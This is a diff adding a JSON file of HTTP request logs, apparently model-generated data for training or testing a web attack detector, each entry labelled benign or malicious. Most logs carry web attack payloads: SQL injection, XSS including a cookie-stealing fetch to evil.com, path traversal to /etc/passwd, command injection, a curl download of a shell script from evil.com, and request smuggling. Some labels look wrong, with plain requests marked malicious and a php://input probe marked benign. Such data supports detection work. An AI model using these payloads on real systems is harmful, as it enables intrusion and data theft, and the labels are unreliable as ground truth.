@@ -1,0 +1,127 @@
+[
+  {
+    "log": "GET http://example.com/login?username=admin'--&password=irrelevant HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=1234567890\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/products?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=abcdef\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/item?id=10+AND+1=1 HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/item?id=1;WAITFOR+DELAY+'00:00:05' HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/product?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,user())) HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/search?q=%3Csvg%20onload%3D%22fetch%28%27http%3A%2F%2Fevil.com%2FstealCookie%27%29%22%3E HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=1234567890\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/page?name=%3Cimg%20src%3D%22javascript%3Aalert%281%29%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=abcdef\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/login HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=xyz987\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nusername=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&password=password123",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/comment HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=secretcookie\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\ncomment=%3Cimg%20src%3Dx%20onerror%3D%22eval%28atob%28%27c3RhcnQgc2NyaXB0JHB0%3D%27%29%29%22%3E",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/profile?id=1%22%3E%3Cscript%3Ealert%28document.location%29%3C%2Fscript%3E HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=xyzabc\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/page?file=../../../../etc/passwd HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=abcdef1234\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/load.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=9876543210\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/file_reader.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=secretcookie\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nfile=php://filter/convert.base64-decode/resource=/etc/passwd",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/secure.php?file=php://input HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=123abc456\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "benign"
+  },
+  {
+    "log": "POST http://example.com/display_log.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=67890xyz\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nfile=../../../../../var/log/apache2/access.log",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/status?ip=127.0.0.1;whoami HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: auth=xyz\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/ping?host=8.8.8.8&&id HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sessionid=abc123\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/login HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: authToken=xyz456\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nusername=admin|ls%20-al",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "GET http://example.com/search?query=test%26cat%20/etc/passwd HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: id_token=session\nConnection: close\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/upload HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: auth=uid789\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nfile=name.txt%00;curl%20http://evil.com/shell.sh",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/login HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: session=abc\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\nusername=test",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/data HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: token=xyz123\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: evil.com\r\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/send HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: user=attacker\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\ndata",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/api HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: auth=xyz\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\n4\r\ndata\r\n0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: internal\r\n\r\n",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  },
+  {
+    "log": "POST http://example.com/post HTTP/1.1\nUser-Agent: Mozilla/5.0\nPragma: no-cache\nCache-Control: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Charset: utf-8\nLanguage: en\nHost: example.com\nCookie: sid=456\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\n\nabc=123",
+    "model": "deepseek-r1",
+    "label": "malicious"
+  }
+]
